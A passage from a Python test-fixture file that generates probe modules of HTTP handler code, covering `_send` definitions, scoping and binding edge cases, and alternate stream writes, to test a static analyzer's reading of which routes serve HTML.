    '_PROBE_DK = "%s"\n\n\ndef _probe_dk_page():\n    _probe_dk_all = [_PROBE_DK for _PROBE_DK in ("a",)]\n    return _PROBE_DK' % (FGH_PAGE % "dk"),
    '_PROBE_DS = "%s"\n\n\ndef _probe_ds_page():\n    _PROBE_DS: str\n    return _PROBE_DS' % (FGH_PAGE % "ds"),
    'def _probe_dpn_page(_probe_dpn_render):\n    return _probe_dpn_render("t")',
    'if True:\n    import json as _PROBE_ER',
    'if True:\n    from json import dumps as _probe_ec',
    'try:\n    import json as _PROBE_EB\nexcept ImportError:\n    pass',
    'if True:\n    def _probe_ed():\n        return "%s"' % (FGH_PAGE % "ed"))) + "\n"
# The probe modules. A_SEND is a `_send` the census reads (a method writing its ctype parameter and its body parameter, and only
# the calls (h) reads), with a slot for more lines before its write; A_JSON_SEND writes application/json, so a call typed through it
# is no route; a module-level `_send` writes through _H, a module name, having no self.
A_SEND = ("    def _send(self, code, body, ctype):\n        self.send_response(code)\n        self.send_header(\"Content-Type\", ctype)\n"
          "        self.end_headers()\n%s        self.wfile.write(body)\n")
A_JSON_SEND = ("    def _send(self, code, body, ctype):\n        self.send_response(code)\n        self.send_header(\"Content-Type\", \"application/json\")\n"
               "        self.end_headers()\n        self.wfile.write(body)\n")
A_MODULE_SEND = 'def _send(code, body, ctype):\n    _H.send_header("Content-Type", %s)\n    _H.wfile.write(body)\n'


def _a_indent(text, n=4):
    """Every non-empty line of text indented by n more spaces."""
    return "".join((" " * n + ln if ln.strip() else ln) for ln in text.splitlines(True))


def _a_module(tag, send="", head="", tail="", call=None, branches=None):
    """A probe module: `head`, then class Handler holding `send` (its `_send` definition or definitions, or nothing) and a do_GET
    serving /probe-<tag> (`call`, its return line; by default the page tagged <tag> through self._send as text/html; `branches`,
    several (tag, return line) pairs, replaces it), then `tail`."""
    branches = branches or ((tag, call or 'return self._send(200, "%s", "text/html")' % (FGH_PAGE % tag)),)
    get = "".join('        if p == "/probe-%s":\n            %s\n' % b for b in branches)
    return ("%sclass Handler(object):\n%s%s    def do_GET(self):\n        p = self.path\n%s        return None\n%s"
            % (head + "\n\n\n" if head else "", send, "\n" if send else "", get, "\n\n" + tail if tail else ""))


def _a_extra(tag):
    """The text a (h) definition writes besides its page parameter, bound to _EXTRA: a fetch tagged `<tag>x`, never scanned."""
    return '_EXTRA = "%s"' % (FGH_PAGE % (tag + "x"))


A_H_ROADS = (("hw2", "a second write of an expression", "        self.wfile.write(_EXTRA.encode())\n", "", "a second write"),
             ("hwl", "writelines", "        self.wfile.writelines([_EXTRA.encode()])\n", "", "a second write"),
             ("hal", "w = self.wfile.write; w(page)", "        w = self.wfile.write\n        w(_EXTRA.encode())\n", "", "a write through an alias"),
             ("hga", 'getattr(self.wfile, "write")(page)', '        getattr(self.wfile, "write")(_EXTRA.encode())\n', "", "a write method named by a string"),
             ("hpr", "print(page, file=self.wfile)", "        print(_EXTRA, file=self.wfile)\n", "", "a print to a stream"),
             ("hsa", "self.connection.sendall(page)", "        self.connection.sendall(_EXTRA.encode())\n", "", "a second write"),
             ("hsl", "s = self.connection.sendall; s(page)", "        s = self.connection.sendall\n        s(_EXTRA.encode())\n", "", "a write through an alias"),
             ("hgs", 'getattr(self.connection, "sendall")(page)', '        getattr(self.connection, "sendall")(_EXTRA.encode())\n', "",
              "a write method named by a string"),
             ("hjd", 'json.dump(page, self.request.makefile("w"))', '        json.dump(_EXTRA, self.request.makefile("w"))\n', "import json\n\n",
              "a call the reader does not read"),
             ("hcf", "shutil.copyfileobj(src, self.wfile)", '        shutil.copyfileobj(open(__file__, "rb"), self.wfile)\n', "import shutil\n\n",
              "a call the reader does not read"),
             ("hhs", "helper(self, page)", "        _probe_helper(self, _EXTRA)\n", "", "a call the reader does not read"),
             ("hhr", "helper(self.request, page)", "        _probe_helper(self.request, _EXTRA)\n", "", "a call the reader does not read"),
             ("hrr", "a reference to the stream beside its write", '        self.send_header("X-Stream", str(self.wfile))\n', "",
              "a reference to the write's receiver other than as its receiver"),
             ("hbs", "len bound at module level", '        self.send_header("Content-Length", str(len(body)))\n', "len = lambda t: 0\n",
              "a call the reader does not read"),
             ("hpb", "a method on a parameter the definition rebinds to the socket", "        cache = self.connection\n        cache.flush_page(_EXTRA)\n", "",
              "a call the reader does not read"),
             # a builtin _body_param reads (len, str) bound inside the definition in another form, and a parameter rebound so, each a local
             # or a rebinding the reader counts since the seventh round's review (extra5-1), each then "a call the reader does not read"
             ("hbi", "len bound by an import in the definition", "        from json import dumps as len\n"
              "        self.send_header(\"Content-Length\", str(len(body)))\n", "", "a call the reader does not read"),
             ("hbd", "str bound by a def statement in the definition", "        def str(x):\n            return x\n"
              "        self.send_header(\"X-Probe\", str(body))\n", "", "a call the reader does not read"),
             ("hbc", "str bound by a class statement in the definition", "        class str(object):\n            pass\n"
              "        self.send_header(\"X-Probe\", str(body))\n", "", "a call the reader does not read"),
             ("hbm", "len bound by a match capture in the definition", "        match code:\n            case len:\n                pass\n"
              "        self.send_header(\"Content-Length\", str(len(body)))\n", "", "a call the reader does not read"),
             ("hbr", "len bound by a match mapping's rest in the definition", "        match {}:\n            case {**len}:\n                pass\n"
              "        self.send_header(\"Content-Length\", str(len(body)))\n", "", "a call the reader does not read"),
             ("hbe", "len bound by an except name in the definition", "        try:\n            pass\n        except Exception as len:\n            pass\n"
              "        self.send_header(\"Content-Length\", str(len(body)))\n", "", "a call the reader does not read"),
             ("hbx", "len deleted in the definition", "        self.send_header(\"Content-Length\", str(len(body)))\n        del len\n", "",
              "a call the reader does not read"),
             ("hpi", "a method on a parameter the definition rebinds by an import", "        import json as cache\n        cache.flush_page(_EXTRA)\n", "",
              "a call the reader does not read"),
             ("hpd", "a method on a parameter the definition rebinds by a def statement", "        def cache():\n            pass\n"
              "        cache.flush_page(_EXTRA)\n", "", "a call the reader does not read"),
             # the same builtins bound by a parameter of a lambda or a def nested in the definition, of each kind (a positional parameter
             # with a default, a keyword-only one, `*args`), and a parameter of the definition rebound by a lambda's parameter or a nested
             # def's `**kwargs` of its name, each counted as the definition's own binding
             ("hla", "len bound by a lambda's parameter in the definition", "        [body].sort(key=lambda x, len=print: len(x))\n", "",
              "a call the reader does not read"),
             ("hls", "str bound by a lambda's keyword-only parameter in the definition", "        [body].sort(key=lambda x, *, str=print: str(x))\n", "",
              "a call the reader does not read"),
             ("hdl", "len bound by a nested def's parameter in the definition", "        def _probe_nest(len=print):\n            return len(body)\n",
              "", "a call the reader does not read"),
             ("hdi", "isinstance bound by a nested def's *args in the definition", "        def _probe_nest(*isinstance):\n"
              "            return isinstance(body, bytes)\n", "", "a call the reader does not read"),
             ("hpl", "a method on a parameter a lambda's parameter in the definition rebinds",
              "        [body].sort(key=lambda x, cache=print: cache.flush_page(x))\n", "", "a call the reader does not read"),
             ("hpk", "a method on a parameter a nested def's **kwargs in the definition rebinds", "        def _probe_nest(**cache):\n"
              "            cache.flush_page(_EXTRA)\n", "", "a call the reader does not read"),
             # the method's self bound again inside the definition (by an assignment, a lambda's parameter or an import) or declared
             # global in a class body nested in it: a header call or a getattr on self there could reach an object other than the
             # handler, so the definition refuses whole, its reason naming the rebinding or the declaration (extra5-1's reader, read at the reviewed head)
             ("hya", "self rebound by an assignment in the definition", "        self = socket\n        self.send_header(\"X-Probe\", \"1\")\n",
              "import socket\n\n", "a definition that rebinds self"),
             ("hyl", "self rebound by a lambda's parameter in the definition",
              "        [body].sort(key=lambda x, self=socket: self.send_header(\"X-Probe\", x))\n", "import socket\n\n", "a definition that rebinds self"),
             ("hyi", "self rebound by an import in the definition", "        import socket as self\n        getattr(self, \"create_connection\")\n", "",
              "a definition that rebinds self"),
             ("hyg", "self declared global in a class body in the definition", "        class _Probe(object):\n            global self\n"
              "            self.send_header(\"X-Probe\", \"1\")\n", "", "a definition that declares self global")) + (
    # and self bound as a type parameter of a class statement in the definition, on the interpreters that parse the form (3.12 and
    # later; on 3.10 and 3.11 it is a syntax error, which the walk names as a PARSE line)
    (("hyt", "self rebound by a type parameter in the definition", "        class _Probe[self]:\n            self.send_header(\"X-Probe\", \"1\")\n",
      "", "a definition that rebinds self"),) if sys.version_info >= (3, 12) else ())
# (h) roads whose definition is not A_SEND with a slot: a definition that writes nothing, one whose one write is a sendall, and a
# module-level `_send` that hangs its headers and a second call off a handler parameter (the name its stream hangs from is no value)
A_H_OTHER = (("hnw", "a definition that writes nothing", _a_module("hnw", (A_SEND % "").replace("        self.wfile.write(body)\n", "")), "no write the census reads"),
             ("hso", "a definition whose one write is a sendall", _a_module("hso", (A_SEND % "").replace("self.wfile.write(body)", "self.connection.sendall(body)")),
              "a write through sendall"),
             ("hmh", "a module-level _send calling a second method on its handler parameter",
              _a_module("hmh", head=_a_extra("hmh") + '\n\n\ndef _send(code, body, ctype, h=None):\n    h.send_header("Content-Type", ctype)\n'
                        "    h.flush_page(_EXTRA)\n    h.wfile.write(body)\n",
                        call='return _send(200, "%s", "text/html", self)' % (FGH_PAGE % "hmh")), "a call the reader does not read"))
A_H_HELPERS = {"hhs": "def _probe_helper(h, t):\n    h.wfile.write(t.encode())\n", "hhr": "def _probe_helper(sock, t):\n    sock.sendall(t.encode())\n"}


def _a_h_module(tag, extra, head):
    send = A_SEND % extra
    if tag in ("hpb", "hpi", "hpd", "hpl", "hpk"): send = send.replace("def _send(self, code, body, ctype):", "def _send(self, code, body, ctype, cache=None):")
    return _a_module(tag, send, head=head + _a_extra(tag), tail=A_H_HELPERS.get(tag, ""))


def _a_rel(tag):
    """A probe module's path: a walked Python file under kernel/, named by its plant's tag."""
    return "kernel/probe_%s.py" % tag


A_CALL_BASE_HEAD = ('import json\n\n_PROBE_CBD = {"k": "%s"}\n_PROBE_CBL = ["%s"]\n_PROBE_CBJ = ["%s"]\n\n\n'
                    'def _probe_dj_page():\n    json = lambda t: {"k": "%s"}\n    return json("t").get("k")'
                    % (FGH_PAGE % "cbd", FGH_PAGE % "cbl", FGH_PAGE % "cbj", FGH_PAGE % "dj")
                    + '\n\n\n_PROBE_CCA = {"k": "%s"}\n_PROBE_CCK = {"k": "%s"}\n_PROBE_CCB = {"k": "%s"}\n\n\n'
                    'def _probe_ccb_page(q, k):\n    return (q or dict(_PROBE_CCB)).copy().get(k)'
                    % (FGH_PAGE % "cca", FGH_PAGE % "cck", FGH_PAGE % "ccb"))
# The scopes around a bare `_send` call (the seventh round's review), each call in a method of its own in one probe module whose
# module-level `_send` writes application/json, so a call typed through it is no route: (the tag, the method's body at column 0 with %s
# for the tag's page, the scope the SERVED line names, the forms it names), and for a call Python sends to the module's def, which the
# census types (no line), None and None: a global declaration with no binding beside it, a call in a nested def's header, in a
# comprehension's first iterable or in a lambda's default, and a comprehension's target outside its comprehension
A_BARE = (("bfw", 'with open(__file__) as _send:\n    return _send(200, "%s", "text/html")', None, "a with target"),
          ("bfa", '_send = str\nreturn _send(200, "%s", "text/html")', None, "an assignment"),
          ("bfu", '_send += str\nreturn _send(200, "%s", "text/html")', None, "an augmented assignment"),
          ("bfn", '_send: object = str\nreturn _send(200, "%s", "text/html")', None, "an annotated assignment"),
          ("bfo", '_send: object\nreturn _send(200, "%s", "text/html")', None, "an annotation"),
          ("bfz", 'if (_send := str):\n    pass\nreturn _send(200, "%s", "text/html")', None, "a walrus"),
          ("bfj", '_all = [(_send := x) for x in (str,)]\nreturn _send(200, "%s", "text/html")', None, "a walrus"),
          ("bfr", 'return _send(200, "%s", "text/html")\ndel _send', None, "a del"),
          ("bfi", 'from json import dumps as _send\nreturn _send(200, "%s", "text/html")', None, "an import"),
          ("bfe", 'try:\n    pass\nexcept Exception as _send:\n    pass\nreturn _send(200, "%s", "text/html")', None, "an except name"),
          ("bfm", 'match 1:\n    case _send:\n        pass\nreturn _send(200, "%s", "text/html")', None, "a match capture"),
          ("bfc", 'class _send(object):\n    pass\nreturn _send(200, "%s", "text/html")', None, "a class statement"),
          ("bfq", 'return [_send(200, "%s", "text/html") for _send in (str,)][0]', "a comprehension around the call", "a comprehension's target"),
          ("bfy", 'return (lambda _send: _send(200, "%s", "text/html"))(str)', "a lambda around the call", "a parameter"),
          ("bfk", '_send = str\n\ndef _inner():\n    nonlocal _send\n    _send = repr\n    return _send(200, "%s", "text/html")\nreturn _inner()',
           "the enclosing function Handler._probe_bfk._inner", "an assignment, under a nonlocal declaration"),
          ("bfv", '_send = str\n\ndef _inner():\n    return _send(200, "%s", "text/html")\nreturn _inner()', None, "an assignment"),
          ("bgs", '_send = str\n\ndef _inner():\n    global _send\n    return _send(200, "%s", "text/html")\nreturn _inner()', None, None),
          ("bgh", 'def _inner(page=_send(200, "%s", "text/html")):\n    _send = page\n    return _send\nreturn _inner()', None, None),
          ("bgi", 'return [x for x in _send(200, "%s", "text/html") for _send in (x,)]', None, None),
          ("bgl", 'return (lambda _send=_send(200, "%s", "text/html"): 0)()', None, None),
          ("bgq", '_all = [0 for _send in (1,)]\nreturn _send(200, "%s", "text/html")', None, None))
A_BARE_MODULE = (A_MODULE_SEND % '"application/json"' + "\n\nclass Handler(object):\n" + "\n".join(
    "    def _probe_%s(self):\n%s" % (tag, _a_indent(body % (FGH_PAGE % tag) + "\n", 8)) for tag, body, _, _ in A_BARE))
A_DEFAULT_HEAD = ('_PROBE_ZDK = "%s"\n_PROBE_ZDU = lambda: "%s"\n\n\n'
                  'def _probe_zdp_page(msg, route="%s"):\n    return "<p>" + msg + "</p>" + route\n\n\n'
                  'def _probe_zdk_page(msg, *, tail=_PROBE_ZDK):\n    return msg + tail\n\n\n'
                  'def _probe_zdn_page():\n    _t = "%s"\n\n    def _pick(page=_t):\n        return page\n    return "<p>zdn</p>" + _pick()\n\n\n'
                  'def _probe_zdo_page():\n    _t = "%s"\n\n    def _pick(page=_t):\n        return page\n\n    def _inner():\n'
                  '        _t = "%s"\n        return _pick()\n    return "<p>zdo</p>" + _inner()\n\n\n'
                  'def _probe_zdu_page(msg, tail=_PROBE_ZDU()):\n    return msg + tail\n\n\n'
                  'def _probe_zds_page(msg, route="%s"):\n    return msg + route'
                  % (FGH_PAGE % "zdk", FGH_PAGE % "zdu", FGH_PAGE % "zdp", FGH_PAGE % "zdn", FGH_PAGE % "zdo", A_PAGE_NONE, FGH_PAGE % "zdsx"))
A_DEFAULT_METHODS = ('    _PROBE_ZDC = "%s"\n\n    def _probe_zdm(self, extra="%s"):\n        return "<p>zdm</p>" + extra\n\n'
                     '    def _probe_zdc(self, extra=_PROBE_ZDC):\n        return "<p>zdc</p>" + extra\n' % (FGH_PAGE % "zdc", FGH_PAGE % "zdm"))
A_DEFAULT_BRANCHES = (("zdp", 'return self._send(200, _probe_zdp_page("hi"), "text/html")'),
                      ("zdk", 'return self._send(200, _probe_zdk_page("<p>zdk</p>"), "text/html")'),
                      ("zdm", 'return self._send(200, self._probe_zdm(), "text/html")'),
                      ("zdn", 'return self._send(200, _probe_zdn_page(), "text/html")'),
                      ("zdo", 'return self._send(200, _probe_zdo_page(), "text/html")'),
                      ("zdc", 'return self._send(200, self._probe_zdc(), "text/html")'),
                      ("zdu", 'return self._send(200, _probe_zdu_page("<p>zdu</p>"), "text/html")'),
                      ("zds", 'return self._send(200, _probe_zds_page("<p>zds</p>", "<p>ok</p>"), "text/html")'))
A_STAR_HEAD = ("from .pages import *\n\n_PROBE_BSP = \"%s\"\n_PROBE_BST = \"application/json\"\n\n\ndef _probe_bsf():\n    return \"%s\""
               % (A_PAGE_NONE, A_PAGE_NONE))
A_FILES = tuple((_a_rel(tag), text) for tag, text in (
    ("c3p", "class _ProbeC3(object):\n    def _send(self, code, ctype, body):\n        self.send_header(\"Content-Type\", ctype)\n"
            "        self.wfile.write(body)\n\n    def do_GET(self):\n        return self._send(200, \"text/html\", \"%s\")\n" % (FGH_PAGE % "c3p")),
    ("tsd", "class _ProbeTwoSends(object):\n    def _send(self, code, body, ctype):\n        self.send_header(\"Content-Type\", ctype)\n"
            "        self.wfile.write(body)\n\n    def _send(self, code, ctype, body):\n        self.send_header(\"Content-Type\", ctype)\n"
            "        self.wfile.write(body)\n\n    def do_GET(self):\n        return self._send(200, \"text/html\", \"%s\")\n" % (FGH_PAGE % "tsd")),
    ("star", _a_module("bsp", A_SEND % "", head=A_STAR_HEAD, branches=(
        ("bsp", 'return self._send(200, "<p>bsp</p>" + _PROBE_BSP, "text/html")'), ("bsf", 'return self._send(200, "<p>bsf</p>" + _probe_bsf(), "text/html")'),
        ("bsb", 'return self._send(200, "<p>bsb</p>" + format("x"), "text/html")'), ("bst", 'return self._send(200, "%s", _PROBE_BST)' % (FGH_PAGE % "bst"))))),
    ("bsc", _a_module("bsc", head="from .pages import *\n\n\n" + A_MODULE_SEND % "ctype", call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "bsc"))),
    ("fst", _a_module("fst", "    @staticmethod\n" + _a_indent(A_MODULE_SEND % "ctype"))),
    ("fkw", _a_module("fkw", "    @staticmethod\n" + _a_indent((A_MODULE_SEND % "ctype").replace("(code, body, ctype)", "(code, body, *, ctype)")),
                      call='return self._send(200, "%s", ctype="text/html")' % (FGH_PAGE % "fkw"))),
    ("fcm", _a_module("fcm", "    @classmethod\n" + (A_SEND % "").replace("(self, code, body, ctype)", "(cls, code, body, ctype)").replace("self.", "cls."))),
    ("fmd", _a_module("fmd", head="def _probe_deco(f):\n    return f\n\n\n@_probe_deco\n" + A_MODULE_SEND % "ctype",
                      call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "fmd"))),
    ("gic", _a_module("gic", A_JSON_SEND + "\n    if True:\n" + _a_indent(A_SEND % ""))),
    ("git", _a_module("git", A_JSON_SEND + "\n    try:\n" + _a_indent(A_SEND % "") + "    except Exception:\n        pass\n")),
    ("giw", _a_module("giw", A_JSON_SEND + "\n    with open(__file__):\n" + _a_indent(A_SEND % ""))),
    ("gim", _a_module("gim", head=A_MODULE_SEND % '"application/json"' + "\n\nif True:\n" + _a_indent(A_MODULE_SEND % "ctype"),
                      call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "gim"))),
    ("gmt", _a_module("gmt", head=A_MODULE_SEND % '"application/json"' + "\n\ntry:\n" + _a_indent(A_MODULE_SEND % "ctype") + "except Exception:\n    pass\n",
                      call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "gmt"))),
    ("gmw", _a_module("gmw", head=A_MODULE_SEND % '"application/json"' + "\n\nwith open(__file__):\n" + _a_indent(A_MODULE_SEND % "ctype"),
                      call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "gmw"))),
    ("gas", _a_module("gas", A_JSON_SEND + "\n    _send = _probe_gas_send\n",
                      tail=(A_SEND % "").replace("    def _send(self,", "def _probe_gas_send(self,").replace("\n        ", "\n    "))),
    ("gsc", "class _ProbeBase(object):\n" + A_JSON_SEND + "\n    def do_GET(self):\n        return self._send(200, \"%s\", \"text/html\")\n\n\n"
            "class Handler(_ProbeBase):\n" % (FGH_PAGE % "gsc") + A_SEND % ""),
    ("gio", _a_module("gio", "    if True:\n" + _a_indent(A_SEND % ""))),
    ("gao", _a_module("gao", "    _send = _probe_gao_send\n",
                      tail=(A_SEND % "").replace("    def _send(self,", "def _probe_gao_send(self,").replace("\n        ", "\n    "))),
    ("lgs", _a_module("lgs", "    def end_headers(self):\n        _PROBE_SOCK.sendall(_EXTRA.encode())\n\n" + A_SEND % "",
                      head="_PROBE_SOCK = None\n" + _a_extra("lgs"))),
    ("lox", "from .kernel import Handler\n\n\nclass _ProbeLoxHandler(Handler):\n" + (A_SEND % "").replace("(self, code, body, ctype)", "(self, code, ctype, body)")),
    ("lfb", _a_module("lfb", A_SEND % "", tail="def _probe_lfb_make():\n    class _ProbeSub(Handler):\n"
                      + _a_indent((A_SEND % "").replace("(self, code, body, ctype)", "(self, code, ctype, body)")) + "    return _ProbeSub\n")),
    # (g)'s population is the module and every class body, one a function body defines included (a factory's class read, fac; two defs
    # in such a class, gnc); a file naming `_send` nowhere but in its calls keeps the true reason (zsb); (g)'s import and header-walrus
    # forms
    ("fac", "def _probe_fac_make():\n" + _a_indent(_a_module("fac", A_SEND % "")) + "    return Handler\n"),
    ("gnc", A_MODULE_SEND % '"application/json"' + "\n\ndef _probe_gnc_make():\n" + _a_indent(_a_module("gnc", A_JSON_SEND + "\n" + A_SEND % ""))
            + "    return Handler\n"),
    ("zsb", "from .kernel import Handler as _ProbeBase\n\n\n" + _a_module("zsb").replace("class Handler(object):", "class Handler(_ProbeBase):")),
    ("gip", _a_module("gip", A_SEND % "" + "    from .kernel import _probe_gip_send as _send\n")),
    ("ghw", _a_module("ghw", A_SEND % "", head="def _probe_ghw_pick(page=(_send := None)):\n    return page\n")),
    # a local sharing the module's `json` import, called as a receiver base (dj), and receiver bases that are calls of a builtin or
    # of an import (cbd, cbl, cbj), in a module whose `json`, `dict` and `list` nothing rebinds (kernel.py's planted text writes `dict`
    # and `list` at module level, the wdu and wla plants, so neither is exempt there)
    ("cb", _a_module("cb", A_SEND % "", head=A_CALL_BASE_HEAD, branches=(
        ("dj", 'return self._send(200, "<p>dj</p>" + _probe_dj_page(), "text/html")'),
        ("cbd", 'return self._send(200, "<p>cbd</p>" + dict(_PROBE_CBD).get("k", ""), "text/html")'),
        ("cbl", 'return self._send(200, "<p>cbl</p>" + list(_PROBE_CBL)[0], "text/html")'),
        ("cbj", 'return self._send(200, "<p>cbj</p>" + json.loads(json.dumps(_PROBE_CBJ))[0], "text/html")'),
        ("cca", 'return self._send(200, "<p>cca</p>" + dict(_PROBE_CCA).copy().get("k"), "text/html")'),
        ("cck", 'return self._send(200, "<p>cck</p>" + dict(**_PROBE_CCK)["k"], "text/html")'),
        ("ccb", 'return self._send(200, "<p>ccb</p>" + _probe_ccb_page(None, "k"), "text/html")')))),
    # a bare `_send` call a scope around it binds (a parameter, a nested def and a loop target in do_GET, beside a module-level def
    # writing application/json; a nested def with no module-level def), and a call that reaches no
    # definition the census reads in a file that binds `_send` (a base class's in the same file, through super(), and a bare call in
    # a file whose one `_send` is a method)
    ("bfp", _a_module("bfp", head=A_MODULE_SEND % '"application/json"', call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "bfp"))
            .replace("    def do_GET(self):\n", "    def do_GET(self, _send=None):\n")),
    ("bfd", _a_module("bfd", head=A_MODULE_SEND % '"application/json"', call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "bfd"))
            .replace("        p = self.path\n", "        p = self.path\n" + _a_indent(A_MODULE_SEND % "ctype", 8))),
    ("bfl", _a_module("bfl", head=A_MODULE_SEND % '"application/json"', call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "bfl"))
            .replace("        p = self.path\n", "        p = self.path\n        for _send in (str,):\n            pass\n")),
    ("clo", _a_module("clo", call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "clo"))
            .replace("        p = self.path\n", "        p = self.path\n" + _a_indent(A_MODULE_SEND % "ctype", 8))),
    ("inh", "class _ProbeBase(object):\n" + A_SEND % "" + "\n\n" + _a_module("inh").replace("class Handler(object):", "class Handler(_ProbeBase):")),
    ("sup", "from .kernel import Handler as _ProbeBase\n\n\n" + _a_module("sup", A_SEND % "", call='return super()._send(200, "%s", "text/html")'
            % (FGH_PAGE % "sup")).replace("class Handler(object):", "class Handler(_ProbeBase):")),
    ("bnm", _a_module("bnm", A_SEND % "", call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "bnm"))),
    # every other binding form, and the scopes a call does not reach (A_BARE), in one module; and a bare call in a class body that binds `_send`
    ("bfx", A_BARE_MODULE),
    ("bcb", _a_module("bcb", A_SEND % "" + '    _probe_bcb = _send(None, 200, "%s", "text/html")\n' % (FGH_PAGE % "bcb"), call="return None")),
    # a function (or its method) that binds `_send` under a `global` declaration, rebinding the module's name, refuses every `_send`
    # call of its file: beside a module-level def (wglb, by an import; bfg, by an assignment in a
    # method whose own bare call it is) and with none (vglc, by a def statement)
    ("wglb", _a_module("wglb", head=A_MODULE_SEND % '"application/json"' + "\n\ndef _probe_use_html():\n    global _send\n    from .pages import html_send as _send\n",
                       call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "wglb"))),
    ("vglc", _a_module("vglc", head="def _probe_install():\n    global _send\n\n" + _a_indent(A_MODULE_SEND % "ctype"),
                       call='return _send(200, "%s", "text/html")' % (FGH_PAGE % "vglc"))),
    ("bfg", A_MODULE_SEND % '"application/json"' + "\n\nclass Handler(object):\n    def _probe_bfg(self):\n        global _send\n        _send = str\n"
            '        return _send(200, "%s", "text/html")\n' % (FGH_PAGE % "bfg")),
    # a comprehension's target named `_send` binds in the comprehension's own scope, never the class body's or the module's, so the
    # file's one direct def types its route: in a class body (ygcp) and at module level (ygcm)
    ("ygcp", _a_module("ygcp", A_SEND % "" + '    _probe_names = [0 for _send in ("a", "b")]\n')),
    ("ygcm", _a_module("ygcm", A_SEND % "", head='_probe_names = [0 for _send in ("a", "b")]')),
    # an attribute store of `_send`, refused at its place as a reference to `_send` other than a call, as a read or a setattr
    # string is: the class's own def, application/json, types the route, and at run time the call reaches the stored function
    ("wats", _a_module("wats", A_JSON_SEND, head="from .pages import html_send as _probe_html_send", tail="Handler._send = _probe_html_send\n")),
    # a super() call as a receiver base: its methods are a base class's, page text the census does not follow
    ("wspg", "class _ProbeBase(object):\n    def page(self):\n        return \"%s\"\n\n\n" % (FGH_PAGE % "wspg")
             + _a_module("wspg", A_SEND % "", call='return self._send(200, "<p>wspg</p>" + super().page(), "text/html")').replace(
                 "class Handler(object):", "class Handler(_ProbeBase):")),
    # a `_send` call through an attribute outside any class body: self (vmsf) or another object (yhms) in a module function of a
    # file whose class binds `_send`, and self in a module function of a file whose module binds it (modh)
    ("vmsf", _a_module("vmsf", A_SEND % "", call="return None", tail='def _probe_serve(self):\n    return self._send(200, "%s", "text/html")\n' % (FGH_PAGE % "vmsf"))),
    ("yhms", _a_module("yhms", A_SEND % "", call="return None", tail='def _probe_serve(h):\n    return h._send(200, "%s", "text/html")\n' % (FGH_PAGE % "yhms"))),
    ("modh", A_MODULE_SEND % "ctype" + '\n\ndef _probe_reply(self):\n    return self._send(200, "%s", "text/html")\n' % (FGH_PAGE % "modh")),
    # a module name only a function binds, under a `global` declaration: refused with its own reason, not the reasonless line
    ("xgo", _a_module("xgo", A_SEND % "", head='def _probe_init():\n    global _PROBE_XGO\n    _PROBE_XGO = "%s"' % (FGH_PAGE % "xgo"),
                      call='return self._send(200, "<p>xgo</p>" + _PROBE_XGO, "text/html")')),
    # the same name bound under the declaration by a match capture (xgm), a star capture (xgs) or a mapping's rest (xgr); and a module
    # constant a function rebinds so, a container the module writes at run time, as one rebound by an assignment there is (xgc)
    ("xgm", _a_module("xgm", A_SEND % "", head='def _probe_init(v):\n    global _PROBE_XGM\n    match v:\n        case _PROBE_XGM:\n            pass',
                      call='return self._send(200, "<p>xgm</p>" + _PROBE_XGM, "text/html")')),
    ("xgs", _a_module("xgs", A_SEND % "", head='def _probe_init(v):\n    global _PROBE_XGS\n    match v:\n        case [*_PROBE_XGS]:\n            pass',
                      call='return self._send(200, "<p>xgs</p>" + _PROBE_XGS, "text/html")')),
    ("xgr", _a_module("xgr", A_SEND % "", head='def _probe_init(v):\n    global _PROBE_XGR\n    match v:\n        case {**_PROBE_XGR}:\n            pass',
                      call='return self._send(200, "<p>xgr</p>" + _PROBE_XGR, "text/html")')),
    ("xgc", _a_module("xgc", A_SEND % "", head='_PROBE_XGC = "%s"\n\n\ndef _probe_init(v):\n    global _PROBE_XGC\n    match v:\n        case _PROBE_XGC:\n'
                      '            pass' % (FGH_PAGE % "xgc"), call='return self._send(200, "<p>xgc</p>" + _PROBE_XGC, "text/html")')),
    # the defaults of a followed function's parameters a call omits: read as the call's argument would be, in the scope the def
    # statement runs in (zdp a module function's positional default, zdk a keyword-only default through a module constant, zdm a
    # method's, zdn a nested def's through the enclosing function's local, zdo the same called from another nested function that binds
    # the name too); refused by name when the reader cannot read them (zdc a method's default naming a name the class body binds, zdu
    # a call the pass does not follow); and a default the call passes is not read (zds)
    ("zdf", _a_module("zdf", A_SEND % "" + A_DEFAULT_METHODS, head=A_DEFAULT_HEAD, branches=A_DEFAULT_BRANCHES))) + tuple(
    (tag, _a_h_module(tag, extra, head)) for tag, _, extra, head, _ in A_H_ROADS) + tuple((tag, text) for tag, _, text, _ in A_H_OTHER))
A_STAR = _a_rel("star")
# The plants' lines, by content: kernel/kernel.py's join SERVED_PLANT_LINES; each probe module's are located in its own text
A_KERNEL_LINES = (tuple((tag, "+ _PROBE_%s," % tag.upper()) for tag, _ in A_HEADER)
                  + tuple((tag, _fgh_mark(tag)) for tag in ("hct", "cnd", "cnc", "cnl", "ctd", "ctc", "ctl", "lox"))
                  + tuple((tag, 'return _probe_%s_make("t")' % tag) for tag in ("dl", "dt", "dw", "dp", "de", "di", "dc", "dr"))
                  + (("dx", 'return _probe_dx_make("t").replace'), ("dq", '[_probe_dq_make("t") for'), ("db", "return _PROBE_DB"),
                     ("dv", "return _PROBE_DV.get("), ("dg", "return _PROBE_DG"), ("dd", "return _PROBE_DD"), ("dn", "return _probe_dn_text"),
                     ("dm", "return _PROBE_DM"), ("dk", "return _PROBE_DK"), ("ds", "return _PROBE_DS"),
                     ("dpn", 'return _probe_dpn_render("t")'), ("er", '+ _PROBE_ER.dumps("x"),'), ("ec", '+ _probe_ec("x"),'), ("eb", "+ _PROBE_EB,"),
                     ("ed", "+ _probe_ed(),")))
A_FILE_LINES = dict((rel, ((rel.split("_", 1)[1][:-3], _fgh_mark(rel.split("_", 1)[1][:-3])),)) for rel, _ in A_FILES
                    if rel not in (A_STAR, _a_rel("lox"), _a_rel("cb"), _a_rel("bfx"), _a_rel("zdf")))
